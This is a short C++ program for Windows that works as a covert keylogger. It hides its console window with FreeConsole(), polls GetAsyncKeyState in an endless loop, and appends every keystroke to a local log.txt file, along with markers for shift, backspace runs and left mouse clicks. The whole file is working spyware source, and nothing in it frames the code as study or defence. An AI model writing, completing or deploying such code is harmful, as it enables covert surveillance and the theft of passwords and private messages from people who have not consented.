#include<iostream>
#include<windows.h>
#include<fstream>
#include<conio.h>
#include<ctime>
using namespace std;
//int keylog(int key,char *file)
//{
    
//}

int main()
{   FreeConsole();
    char i,pre,pre1,pre2;
    int count1=1,count2=1,count3=1,count=0;
    //FILE *opfile;
   // opfile=fopen("log.txt","a");5th test;
   //time_t now = time(0);
   // char* dt = ctime(&now);
   // struct tm *time=localtime(&now);
    int a;
    
    
        
    
    while(true)
   {    //Sleep(10);
       
        for(i=8;i<=255;i++)
        {
           if(GetAsyncKeyState(i)==-32767)
            {
                 ofstream fp("log.txt",ios::app); 
               //cout<<i<<endl;
                
                if(i==VK_SHIFT)
                    fp<<"[shift]";
               else if(i==VK_RETURN)
                    fp<<'\n';
               else if(i==VK_LBUTTON)
                {
                    if(i!=pre)
                    {
                        fp<<"[lbutton"<<count2<<"]";
                        
                    }
                    count2++;
                }
               else if(i==VK_BACK)
               {    if(i==pre)
                        ++count1;
                    else
                        count1=1;
                    
               }
                else{
                    if(pre == VK_BACK){
                        fp<<"[BACK"<<count1<<"]";
                        
                    }
           
                   
                    fp<<i;
                }
                
           
                 pre=i;
                // pre1=i;
               // a=time->tm_min;
                // if(a%2==0)
                //    fp<<dt<<endl;

            } 
          
            
            // fp.close();
           
            
        }pre=0;
        //count1=0;
        
                     
        


   }
   
                

    

     

}